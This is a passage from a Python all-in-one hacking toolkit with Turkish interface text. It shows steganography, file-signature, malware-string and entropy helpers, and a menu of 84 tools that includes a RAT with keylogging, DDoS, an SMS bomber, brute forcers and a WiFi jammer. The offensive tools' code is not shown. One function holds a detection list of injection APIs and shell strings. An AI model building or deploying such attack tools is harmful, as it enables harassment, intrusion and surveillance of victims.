                r,g,b=px[x,y]; bits+=[r&1,g&1,b&1]
        for i in range(0,len(bits)-7,8):
            byte=0
            for b in bits[i:i+8]: byte=(byte<<1)|b
            if byte==0: break
            msg+=chr(byte)
        ok("[+] LSB gizli: %r"%msg) if msg else warn("[-] gizli veri yok")
    except Exception as e: err(str(e))

def tool_filesig():
    print(c("\n[82 - FILE SIGNATURE]",CYN,True))
    fp=input(c("Dosya: ",YEL)).strip()
    if not os.path.exists(fp): err("[!] yok"); return
    d=open(fp,"rb").read(16)
    sigs={b"\x89PNG":"PNG","%PDF":"PDF","MZ":"EXE/DLL","\x7fELF":"ELF_Linux","GIF8":"GIF","\xff\xd8\xff":"JPEG",'PK\x03\x04':"ZIP/OFFICE"}
    found="Bilinmeyen"
    for raw,name in sigs.items():
        if d.startswith(raw if isinstance(raw,bytes) else raw.encode()): found=name; break
    ok("[+] Tur: %s (ilk boytlar: %s)"%(found," ".join("%02x"%b for b in d[:8])))

def tool_malstr():
    print(c("\n[83 - MALWARE STRINGS]",CYN,True))
    fp=input(c("Dosya: ",YEL)).strip()
    if not os.path.exists(fp): err("[!] yok"); return
    data=open(fp,"rb").read()
    pats=[b"CreateRemoteThread",b"VirtualAllocEx",b"WriteProcessMemory",b"ShellExecute",b"WinExec",b"LoadLibrary",b"/bin/sh",b"powershell -enc",b"cmd /c",b"base64"]
    hits=[]
    for p in pats:
        if p in data: hits.append(p.decode())
    if hits: warn("[!] Sistoslari: %s"%hits)
    else: info("[+] Bilinen zararli string yok")
    ascii_strings=re.findall(rb'[\x20-\x7e]{6,}',data)
    urls=[s for s in ascii_strings if b"http" in s][:5]
    for u in urls: info("[url] %s"%u.decode("utf-8","ignore")[:80])

def tool_cryptodete():
    print(c("\n[84 - CRYPTO DETECT]",CYN,True))
    d=input(c("Yol: ",YEL)).strip()
    if not os.path.exists(d): err("[!] yok"); return
    data=open(d,"rb").read(8192)
    import collections, math
    cnt=collections.Counter(data); n=len(data)
    ent=-sum((x/n)*math.log2(x/n) for x in cnt.values()) if n else 0
    info("[+] Entropi ilk 8KB: %.2f"%ent)
    if ent>7.5: warn("[!] YUKSEK entropi -> sifreli/komprese olabilir")
    sigs={b"BEGIN RSA PRIVATE KEY":"RSA ozel anahtar",b"BEGIN OPENSSH PRIVATE KEY":"OpenSSH anahtar",b"-----BEGIN":"PGP/Anahtar bloku"}
    for s,n in sigs.items():
        if s in open(d,"rb").read(): warn("[!] %s tespit edildi"%n)
    ok("[+] Tamam")

# ==================== MENU ====================
MENU=[
    ("RAT C2 (Ekran+Keylog+IMEI)", tool_rat),
    ("DDoS Attack", tool_ddos),
    ("SMS Bomber", tool_sms),
    ("Wifix Hack (WiFi Test)", tool_wifix),
    ("Port Scanner", tool_portscan),
    ("SQL Injection Scanner", tool_sqli),
    ("XSS Scanner", tool_xss),
    ("Subdomain Enum", tool_subdomain),
    ("Directory Fuzzer", tool_dirfuzz),
    ("WordPress Scanner", tool_wpscan),
    ("Hash Cracker", tool_hashcrack),
    ("SSH Brute Force", tool_sshbrute),
    ("XXE Scanner", tool_xxe),
    ("ARP Spoofer", tool_arp),
    ("Log Analyzer", tool_loganalyzer),
    ("File Integrity Monitor", tool_fim),
    ("SSL/TLS Checker", tool_ssl),
    ("Password Strength", tool_passcheck),
    ("YARA Scanner", tool_yara),
    ("DNS Security Check", tool_dns),
    ("IOC Scanner", tool_ioc),
    ("Honeypot", tool_honeypot),
    ("Entropy Analyzer", tool_entropy),
    ("Base Converter", tool_baseconv),
    ("Subnet Calculator", tool_subnet),
    ("Hash Generator", tool_hashgen),
    ("MAC Generator", tool_macgen),
    ("IP Generator", tool_ipgen),
    ("SSID Generator", tool_ssidgen),
    ("MAC Changer", tool_macch),
    ("IP Changer", tool_ipch),
    ("SSID Scanner", tool_wifiscan),
    ("BSSID Finder", tool_bssidf),
    ("WiFi Monitor", tool_wifimon),
    ("WPS Pin Gen", tool_wpspin),
    ("WiFi Jammer", tool_wifijam),
    ("Network Scanner", tool_netscan),
    ("Port Sweep", tool_portsw),
    ("Service Scan", tool_servscan),
    ("OS Fingerprint", tool_osfp),
    ("DNS Bruteforce", tool_dnsbrut),
    ("Reverse DNS", tool_rdns),
    ("MX Lookup", tool_mxlook),
    ("SPF Check", tool_spf),
    ("DKIM Check", tool_dkim),
    ("Domain Age", tool_domage),
    ("Whois Lookup", tool_whois),
    ("GeoIP Finder", tool_geoip),
    ("IP Calculator", tool_ipcalc),
    ("MAC Vendor", tool_macven),
    ("Subnet Dump", tool_subdump),
    ("ARP Table", tool_arptab),
    ("Route Trace", tool_tracer),
    ("TTL Scan", tool_ttl),
    ("HTTP Header Analiz", tool_httphead),
    ("Cookie Incele", tool_cookiegrab),
    ("Admin Finder", tool_adminfind),
    ("Login Form Brute", tool_loginbrute),
    ("Form XSS Probe", tool_formxss),
    ("HTML Parser", tool_htmlparse),
    ("Link Extractor", tool_linkext),
    ("Email Harvester", tool_emailharv),
    ("Phone Harvester", tool_phoneharv),
    ("OSINT Username", tool_osintuser),
    ("Pastebin Bul", tool_paste),
    ("GitHub Dork", tool_gitdork),
    ("Google Dork", tool_gdork),
    ("Shodan Check", tool_shodan),
    ("Password Gen", tool_passgen),
    ("Wordlist Gen", tool_wlgen),
    ("MD5 Dict", tool_md5dict),
    ("SHA1 Brute", tool_sha1brut),
    ("Zip Cracker", tool_zipcrack),
    ("RAR Cracker", tool_rarcrack),
    ("XOR Decode", tool_xor),
    ("Caesar Cipher", tool_caesar),
    ("Base64 Encode", tool_b64e),
    ("Base64 Decode", tool_b64d),
    ("Hex Dump", tool_hexdump),
    ("QR Generate", tool_qr),
    ("Steg Extract", tool_steg),
    ("File Signature", tool_filesig),
    ("Malware Strings", tool_malstr),
    ("Crypto Detect", tool_cryptodete),
]

def show_menu():
    print(); print(c("="*70,CYN)); print(c("  ETT ETERNETLOG %s | ANA MENU (%d Arac)"%(VERSION,len(MENU)),YEL,True)); print(c("="*70,CYN))
    for i,(name,_) in enumerate(MENU,1): print(c("  [%2d]"%i,GRN,True)+c(" %s"%name,WHT))
    print(c("  [ 0]",RED,True)+c(" Cikis",WHT)); print(c("="*70,CYN))

def main():
    if sys.stdout.isatty(): os.system("clear")
    banner()
    while True:
        show_menu()
        try: ch=input(c("Secim > ",GRN,True)).strip()
        except (EOFError,KeyboardInterrupt): print(c("[+] Gorusuruz! | "+CREATOR,MAG,True)); break
        if ch in ("0","q","exit","quit"): print(c("[+] Gorusuruz! | "+CREATOR,MAG,True)); break
        if ch.isdigit():
            idx=int(ch)
            if 1<=idx<=len(MENU):
                name,fn=MENU[idx-1]
                print(c("="*70,CYN)); print(c("  ARAC %d: %s"%(idx,name),MAG,True)); print(c("="*70,CYN))
                try: fn()
                except KeyboardInterrupt: err("\n[!] Durduruldu")
                except Exception as e: err("[!] Hata: %s"%e)
                input(c("\n[Enter] Menuye donmek icin...",CYN)); continue
        err("[!] Gecersiz secim")

if __name__=="__main__":
    main()
